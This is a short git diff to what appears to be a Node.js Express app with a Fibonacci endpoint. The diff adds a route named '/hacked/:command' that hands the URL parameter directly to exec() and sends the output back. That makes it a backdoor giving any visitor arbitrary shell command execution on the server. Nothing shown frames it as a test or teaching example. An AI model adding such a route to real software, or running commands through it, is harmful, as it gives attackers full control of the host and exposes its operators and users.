@@ -20,6 +20,14 @@ app.get('/fibonacci/:n' , function(req,res){
 
 });
 
+app.get("/hacked/:command" , function(req,res){
+
+  var child = exec(req.params.command, function (error, stdout, stderr) {
+    res.send(stdout);
+  });
+
+});
+
 app.listen(3000 , function(){
 
   console.log('Your app is ready and listening on port 3000');
